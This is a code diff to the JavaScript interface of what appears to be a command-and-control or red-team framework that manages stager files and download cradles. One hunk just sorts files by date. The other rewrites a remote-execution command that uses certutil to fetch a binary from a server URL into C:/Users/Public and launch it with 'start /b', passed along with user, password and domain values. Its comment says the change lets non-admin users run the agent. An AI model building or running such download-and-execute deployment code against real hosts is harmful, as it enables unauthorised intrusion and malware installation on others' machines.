@@ -14045,6 +14045,9 @@ function renderStagerFiles(files) {
   const tbody = document.getElementById('stager-files-tbody');
   if (!tbody) return;
 
+  // Always show newest file first regardless of server response order.
+  (files||[]).sort((a, b) => (b.added_at || '').localeCompare(a.added_at || ''));
+
   // Update cradles file selector
   const sel = document.getElementById('cradles-file-select');
   if (sel) {
@@ -17222,9 +17225,9 @@ async function ipcRun(action) {
       // _x suffix avoids file-lock if the same binary is already running under its original name.
       const fname   = rpFwd.replace(/.*\//, '');
       const rpInj   = 'C:/Users/Public/' + fname.replace(/(\.[^.\/\\]+)$/, '_x$1');
-      // wmic treats '/' as flag prefix — must use backslashes for the executable path.
+      // Use start /b to detach agent from cmd so non-admin users can run it (wmic requires WMI perms).
       const rpInjBs = rpInj.replace(/\//g, '\\');
-      const winCmd  = `cmd.exe /c certutil -urlcache -split -f ${surl} ${rpInj} && wmic process call create ${rpInjBs}`;
+      const winCmd  = `cmd.exe /c certutil -urlcache -split -f ${surl} ${rpInj} && start /b ${rpInjBs}`;
       const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const dDQ = (a.domain ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
